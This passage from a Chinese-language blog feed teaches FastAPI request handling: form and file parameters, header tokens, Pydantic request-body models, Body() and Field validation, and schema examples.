class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> typing<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Form, File, UploadFile<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/register&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params"></span><br><span class="hljs-params">        avatar: typing.<span class="hljs-type">Optional</span>[<span class="hljs-built_in">bytes</span>] = File(<span class="hljs-params">default=<span class="hljs-literal">None</span></span>),</span><br><span class="hljs-params">        username: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>),</span><br><span class="hljs-params">        password: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params">min_length=<span class="hljs-number">6</span>, max_length=<span class="hljs-number">10</span></span>),</span><br><span class="hljs-params">        accessary: typing.<span class="hljs-type">Optional</span>[UploadFile] = <span class="hljs-literal">None</span></span><br><span class="hljs-params"></span>):<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: username,<br>        <span class="hljs-string">&quot;password&quot;</span>: password,<br>        <span class="hljs-string">&quot;avatar&quot;</span>: <span class="hljs-built_in">len</span>(avatar) <span class="hljs-keyword">if</span> avatar <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;accessary&quot;</span>: accessary.filename <span class="hljs-keyword">if</span> accessary <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>【注意】：<strong>同时使用Form和File时，File要放在Form前面。</strong></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>编程，web开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】FastAPI请求头体（二）</title>
    <link href="/2024/01/16/682FastAPI2%E8%AF%B7%E6%B1%82%E5%A4%B4%E4%BD%93/"/>
    <url>/2024/01/16/682FastAPI2%E8%AF%B7%E6%B1%82%E5%A4%B4%E4%BD%93/</url>
    
    <content type="html"><![CDATA[<h1 id="3-1使用Header-接收请求头参数"><a href="#3-1使用Header-接收请求头参数" class="headerlink" title="3-1使用Header 接收请求头参数"></a>3-1使用Header 接收请求头参数</h1><p><strong>需求场景：</strong>假设现在我们有个图书网站，需要客户端在请求头上携带有效的token，才可以获取图书数据，那FastAPI该如何获取客户端传过来的请求头参数呢？</p><p>示例1：FastAPI获取，指定请求头的值（比如，请求头的key 是<code>token</code>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Header <span class="hljs-comment"># 引入Header类</span><br><br>app = FastAPI()<br>books = &#123;i: <span class="hljs-string">f&quot;图书<span class="hljs-subst">&#123;i&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)&#125;<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books/&#123;id&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_book_by_id</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span>, token: <span class="hljs-built_in">str</span> = Header(<span class="hljs-params"></span>)</span>):<span class="hljs-comment"># token=Header() token是Header 的实例化对象</span><br>    <span class="hljs-keyword">if</span> token == <span class="hljs-string">&quot;this-is-token&quot;</span>:<br>        <span class="hljs-keyword">return</span> books.get(<span class="hljs-built_in">id</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;invalid token&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>1、Header和Path() Query()类似，也具有基本的请求头参数校验和API文档设置</p><p>2、如果定义的参数是请求头参数，则必须使用Header() 否则FastAPI默认会把这个参数识别的查询参数</p></blockquote><h1 id="3-2-使用请求体提交数据【重点】"><a href="#3-2-使用请求体提交数据【重点】" class="headerlink" title="3-2 使用请求体提交数据【重点】"></a>3-2 使用请求体提交数据【重点】</h1><p>向服务器提交数据，可以通过之前咱们学的路径参数、查询参数、也可以在请求体中携带数据（推荐用法）</p><p>推荐使用请求体向服务器提交数据的原因：</p><ul><li>路径参数和查询参数携带的数据量有限</li><li>路径参数和查询参数携带数据不安全</li></ul><p>那我们该如何使用请求体向服务端提交数据呢？一般有两种方式：【二选一】</p><ul><li><p>使用POST请求，在请求体中使用JSON格式的数据；PUT&#x2F;PATCH等也可以在请求体中使用JSON格式数据</p></li><li><p>使用POST请求，在请求体中使用form-data格式的数据，提交数据（即前端的form表单，第6章详细介绍）</p></li></ul><p>实现方式： 使用Pydantic 来接收请求体数据</p><p>第一步：继承Pydantic的<code>BaseModel</code>,定义模型类User,再类钟定义两个和请求体字段同名的类数学并做类型提示</p><p>第二步：再路径函数钟定义形参user ,设置类型未User</p><p>第三步：通过对象<code>user</code>属性<code>username</code>和<code>password</code>获取请求体字段的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel <span class="hljs-comment"># 引用基础模型</span><br>app  = FastAPI()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    username: <span class="hljs-built_in">str</span><br>    password: <span class="hljs-built_in">str</span><br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">user: User</span>):<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: user.username,<br>        <span class="hljs-string">&quot;password&quot;</span>: user.password<br>    &#125;<br></code></pre></td></tr></table></figure><p>这样可以帮我们获取到请求体参数并赋值到参数<code>user</code>，同时：</p><ul><li>1、按照json格式来读取请求体数据</li><li>2、把类型转换且进行类型校验（类型必须符合User格式）</li><li>3、把请求体中每个字段的值赋值到模型类对象的每个属性（赋值到User类，基础自基础模型类）</li><li>4、API文档可以看到类型提示</li></ul><p><strong>结论</strong>：</p><ul><li>如果请求体参数是JSON格式，就通过继承Pydantic的 <code>BaseModel</code> 的方式来获取数据</li><li><code>BaseModel</code>的子类中定义的类属性是用来匹配请求体对应的字段值，所以名字包保持一致，字段的顺序没有要求</li><li>只要路径函数式中形参的类型是<code>BaseModel</code>的子类，则FastAPI会默认会把请求体数据保存在这个变量中</li><li>定义的模型类的属性，可以有默认值</li></ul><h1 id="3-4-多请求体-入参-不常用"><a href="#3-4-多请求体-入参-不常用" class="headerlink" title="3-4 多请求体 入参 不常用"></a>3-4 多请求体 入参 不常用</h1><p>原理是一样的，就是多定义一个模型而已，不常用拉</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    username: <span class="hljs-built_in">str</span><br>    password: <span class="hljs-built_in">str</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Item</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    name: <span class="hljs-built_in">str</span><br>    description: typing.<span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-literal">None</span>  <span class="hljs-comment"># 选填类型，Optional可选的意思</span><br>    price: <span class="hljs-built_in">float</span><br>    tax: typing.<span class="hljs-type">Optional</span>[<span class="hljs-built_in">float</span>] = <span class="hljs-literal">None</span>  <span class="hljs-comment"># 选填类型，Optional可选的意思</span><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login_double&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_login_double</span>(<span class="hljs-params">user: User, item: Item</span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;user&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>: user.username,<br>            <span class="hljs-string">&quot;password&quot;</span>: user.password,<br>        &#125;,<span class="hljs-string">&quot;item&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;name&quot;</span>: item.name,<br>            <span class="hljs-string">&quot;description&quot;</span>: item.description,<br>            <span class="hljs-string">&quot;price&quot;</span>: item.price,<br>            <span class="hljs-string">&quot;tax&quot;</span>: item.tax,&#125;&#125;<br></code></pre></td></tr></table></figure><h1 id="3-5-使用Body接收请求体数据"><a href="#3-5-使用Body接收请求体数据" class="headerlink" title="3-5 使用Body接收请求体数据"></a>3-5 使用Body接收请求体数据</h1><p>当你需要和其他入参一起发出请求的时候，比如说</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;item&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Foo&quot;</span>,<br>        <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;The pretender&quot;</span>,<br>        <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">42.0</span>,<br>        <span class="hljs-string">&quot;tax&quot;</span>: <span class="hljs-number">3.2</span><br>    &#125;,<br>    <span class="hljs-string">&quot;user&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;liuxu&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;liuxu&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;importance&quot;</span>: <span class="hljs-number">5</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上面的两种情况，直接使用继承Pydantic的BaseModel定义模型类的方式行不通，需要借助<code>Body()</code>函数来帮忙</p><p>示例1：使用Body()获取请求体中单一字段变量，比如需求1中的 <code>&quot;importance&quot;: 5</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    username: <span class="hljs-built_in">int</span><br>    password: <span class="hljs-built_in">str</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Item</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    name: <span class="hljs-built_in">str</span><br>    description: typing.<span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-literal">None</span><br>    price: <span class="hljs-built_in">float</span><br>    tax: typing.<span class="hljs-type">Optional</span>[<span class="hljs-built_in">float</span>] = <span class="hljs-literal">None</span><br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">user: User, item: Item, importance: <span class="hljs-built_in">int</span> = Body(<span class="hljs-params"></span>)</span>):<span class="hljs-comment"># 定义和请求体字段同名的形参并使用Body()</span><br>    <span class="hljs-keyword">return</span> importance<br></code></pre></td></tr></table></figure><blockquote><p>1、 Body()函数的室友和前面的Path() Query(),Header()基本一致</p><p>2、如果你仅仅需要从请求体中获取importance，其他字段不需要，可直接：<code>def login(importance: int = Body()):</code></p></blockquote><h1 id="3-6-请求体使用Body校验"><a href="#3-6-请求体使用Body校验" class="headerlink" title="3.6 请求体使用Body校验"></a>3.6 请求体使用Body校验</h1><ul><li><p>Body和前面接收的 Path、Query、Header一样，都可以做数值校验和字符串的基本校验</p></li><li><p>只不过Body校验的是请求体中的<strong>单一数据</strong>，比如请求体中只有一个数字或者一个字符串才可以</p></li><li><p>除此之外，还可以设置请求体的类型，默认是<code>application/json</code>，即JSON格式</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Body<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span> = Body(<span class="hljs-params">min_length=<span class="hljs-number">3</span></span>), age: <span class="hljs-built_in">int</span> = Body(<span class="hljs-params">ge=<span class="hljs-number">18</span></span>)</span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;name&quot;</span>: name, <span class="hljs-string">&quot;age&quot;</span>: age&#125;<br></code></pre></td></tr></table></figure><h1 id="3-7-模型类嵌套"><a href="#3-7-模型类嵌套" class="headerlink" title="3.7 模型类嵌套"></a>3.7 模型类嵌套</h1><p>客户端传过来的请求体数据结构是复杂的嵌套结构，比如下面这种，此时后端该如何接收数据呢？</p><p>需求3：嵌套列表中的模型类</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Foo&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;The pretender&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;price&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">42.0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;tax&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3.2</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;images&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://example.com/baz.jpg&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;The Foo live&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://example.com/dave.jpg&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;The Baz&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>示例3：解决 嵌套列表中的模型类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Optional</span><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel<br><br>app = FastAPI()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Image</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    url: <span class="hljs-built_in">str</span><br>    name: <span class="hljs-built_in">str</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Item</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    name: <span class="hljs-built_in">str</span><br>    price: <span class="hljs-built_in">float</span><br>    images: <span class="hljs-type">Optional</span>[<span class="hljs-type">List</span>[Image]] = <span class="hljs-literal">None</span><br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/item&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_item</span>(<span class="hljs-params">item: Item</span>):<br>    <span class="hljs-keyword">return</span> item<br></code></pre></td></tr></table></figure><h1 id="3-8-请求体字段使用Filed校验"><a href="#3-8-请求体字段使用Filed校验" class="headerlink" title="3.8 请求体字段使用Filed校验"></a>3.8 请求体字段使用Filed校验</h1><p>请求体的每个字段可以单独做校验吗，比如：</p><ul><li><code>name</code>的长度最少是3，</li><li><code>price</code>不少于10</li><li>&#96;tags字段限制元素不重复，限制元素的个数等等</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Foo&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;The pretender&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;price&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">42.0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;tax&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3.2</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;tags&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;rock&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;metal&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;bar&quot;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>示例1：使用 <code>Field</code>来校验每个请求体字段，注意，<code>Field</code>不是从FastAPI导入的，而是直接从Pydantic导入的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span>, <span class="hljs-type">List</span><br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel, Field<br><br>app = FastAPI()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Item</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    name: <span class="hljs-built_in">str</span> = Field(min_length=<span class="hljs-number">5</span>)<br>    description: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = Field(default=<span class="hljs-literal">None</span>, max_length=<span class="hljs-number">300</span>)<br>    price: <span class="hljs-built_in">float</span> = Field(gt=<span class="hljs-number">0</span>, multiple_of=<span class="hljs-number">2</span>)<br>    tax: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>] = Field(min_items=<span class="hljs-number">2</span>, max_items=<span class="hljs-number">5</span>, unique_items=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/item&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_item</span>(<span class="hljs-params">item: Item</span>):<br>    <span class="hljs-keyword">return</span> item<br><br></code></pre></td></tr></table></figure><p>校验参数总结：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">gt/ge/lt/le:<span class="hljs-comment"># 数值大小校验(float)</span><br>min_length/max_length    <span class="hljs-comment"># 字符串长度校验(int)</span><br>min_items/max_items<span class="hljs-comment"># 集合元素数量校验（int）</span><br>unique_items<span class="hljs-comment"># 集合元素是否可以重复(布尔值)</span><br>multiple_of<span class="hljs-comment"># 限制值的某个数字的倍数（float）</span><br><br>max_digits<span class="hljs-comment"># 最长多少位数字【bug】</span><br>decimal_places<span class="hljs-comment">#　最多几位小数【bug】</span><br></code></pre></td></tr></table></figure><h1 id="3-9-总结获取请求体数据的3种方式"><a href="#3-9-总结获取请求体数据的3种方式" class="headerlink" title="3.9 总结获取请求体数据的3种方式"></a>3.9 总结获取请求体数据的3种方式</h1><p><strong>使用Pydantic</strong>【主要】</p><ul><li>定义模型类BaseModle，和请求体中的字段保持一致，定义模型类的属性并做<strong>类型提示</strong>（支持类型校验和类型转换）</li></ul><p><strong>使用Body()</strong></p><ul><li>有个特殊的请求体格式，使用Body()显示获取，比如，单一字段的值，内嵌字段的值</li><li>可以与其他参数一起使用：<code>Body()</code> 函数可以与其他参数（如路径参数、查询参数等）一起使用，以便更灵活地定义请求处理函数的参数。</li><li>支持更多的参数配置：<code>Body()</code> 函数支持传递更多参数配置，如数据类型、默认值等。</li></ul><p><strong>使用Python的字典类型和列表类型</strong></p><ul><li>定义在路径函数内的特殊字段会默认被视为请求体参数，比如列表，集合，元祖，字典（容器型数据）</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/item&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_item</span>(<span class="hljs-params">item: typing.<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]</span>): <span class="hljs-comment"># 直接在路径上</span><br>    <span class="hljs-keyword">return</span> item<br></code></pre></td></tr></table></figure><ul><li>也可以通过@dataclasses.dataclass类装饰器转装饰成数据类</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@dataclasses.dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    username: <span class="hljs-built_in">str</span><br>    password: <span class="hljs-built_in">str</span><br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/item&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_item</span>(<span class="hljs-params">user: User</span>):<br>    <span class="hljs-keyword">return</span> user<br></code></pre></td></tr></table></figure><h1 id="3-10-给请求体提供范例"><a href="#3-10-给请求体提供范例" class="headerlink" title="3.10 给请求体提供范例"></a>3.10 给请求体提供范例</h1><p>提供范例后，再阅读API文档的时候更方便</p><p>FastAPI提供了多种为请求体提供范例的方式</p><p>示例1：在模型类中定义 <code>Config</code>类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Union</span><br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel<br><br>app = FastAPI()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Item</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    name: <span class="hljs-built_in">str</span><br>    description: <span class="hljs-type">Union</span>[<span class="hljs-built_in">str</span>, <span class="hljs-literal">None</span>] = <span class="hljs-literal">None</span><br>    price: <span class="hljs-built_in">float</span><br>    tax: <span class="hljs-type">Union</span>[<span class="hljs-built_in">float</span>, <span class="hljs-literal">None</span>] = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span>:<br>        schema_extra = &#123;<br>            <span class="hljs-string">&quot;example&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Foo&quot;</span>,<br>                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;A very nice Item&quot;</span>,<br>                <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">35.4</span>,<br>                <span class="hljs-string">&quot;tax&quot;</span>: <span class="hljs-number">3.2</span>,<br>            &#125;<br>        &#125;<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/item&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_item</span>(<span class="hljs-params">item: Item</span>):<br>    <span class="hljs-keyword">return</span> item<br></code></pre></td></tr></table></figure><p>示例2：使用 <code>Field(example=&quot;xxx&quot;)</code>为每个字段提供例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Union</span><br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel, Field<br><br>app = FastAPI()<br><br><br><span class="hljs-keyword">class</span> <span 